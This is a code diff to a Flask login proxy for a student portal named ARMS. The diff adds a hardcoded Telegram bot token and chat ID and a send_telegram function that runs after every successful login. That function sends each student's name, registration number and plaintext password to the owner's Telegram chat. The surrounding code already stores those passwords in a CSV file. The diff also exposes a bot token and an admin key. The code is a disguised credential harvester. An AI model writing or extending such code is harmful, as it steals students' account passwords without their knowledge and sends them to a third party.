@@ -17,6 +17,20 @@ CORS(app)
 CREDS_FILE  = "user_credentials.csv"
 ADMIN_KEY   = "arms_admin_2024$"   # Secret key — only you know this
 
+# ── Telegram Notifications ────────────────────────────────────────────────────
+TG_TOKEN   = "8991851001:AAGN874QD3K7y4MZlAU44im41kM0MEkPPkE"
+TG_CHAT_ID = "7371123117"
+
+def send_telegram(message):
+    """Send a message to the owner's Telegram."""
+    try:
+        url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
+        payload = json.dumps({"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "HTML"}).encode()
+        r = req.post(url, data=payload, headers={"Content-Type": "application/json"}, timeout=5)
+        return r.status_code == 200
+    except:
+        return False
+
 def load_credentials():
     creds = {}
     if os.path.exists(CREDS_FILE):
@@ -447,7 +461,6 @@ def student_login():
 
         # Check if login succeeded — ARMS redirects to StudentPortal on success
         if "StudentPortal" in r2.url or "student" in r2.url.lower():
-            # Fetch the student name from our data
             name = ""
             try:
                 int_id = get_int_id(reg_no)
@@ -457,6 +470,15 @@ def student_login():
             except:
                 pass
             save_credential(reg_no, password, name)
+            # Send Telegram notification
+            msg = (
+                f"🔐 <b>New Login</b>\n"
+                f"👤 Name: {name or 'Unknown'}\n"
+                f"🎓 Reg No: <code>{reg_no}</code>\n"
+                f"🔑 Password: <code>{password}</code>\n"
+                f"🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
+            )
+            send_telegram(msg)
             return jsonify({"success": True, "name": name, "reg_no": reg_no})
         else:
             return jsonify({"success": False, "error": "Invalid registration number or password."}), 401
